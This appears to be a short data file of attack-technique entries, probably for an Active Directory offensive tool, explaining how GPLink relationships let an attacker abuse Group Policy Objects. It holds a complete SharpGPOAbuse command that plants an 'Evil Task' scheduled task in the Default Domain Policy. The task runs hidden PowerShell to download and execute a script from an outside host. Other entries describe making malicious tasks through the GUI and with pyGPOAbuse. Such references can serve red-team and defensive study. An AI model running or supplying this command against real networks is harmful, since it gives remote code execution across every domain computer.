GPLink.meaning: A linked GPO applies its settings to objects in the linked container. The GPLink relationship connects a Group Policy Object (GPO) to an AD domain or organizational unit (OU) it is linked to.

SharpGPOAbuse.command: SharpGPOAbuse.exe --AddComputerTask --TaskName "Evil Task" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.1:80/a'))\"" --GPOName "Default Domain Policy"
SharpGPOAbuse.description: Add malicious scheduled task to linked GPO

GroupPolicy.command: # Navigate to GPO -> Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks
GroupPolicy.description: Navigate to scheduled tasks in GPO editor

GroupPolicy.command: # Create new scheduled task with malicious payload
GroupPolicy.description: Create malicious scheduled task through GUI

PowerShell.description: Generate GPO report to understand current settings
Modify GPO settings using PowerShell cmdlets

pyGPOAbuse.description: Abuse GPO from Linux using pyGPOAbuse
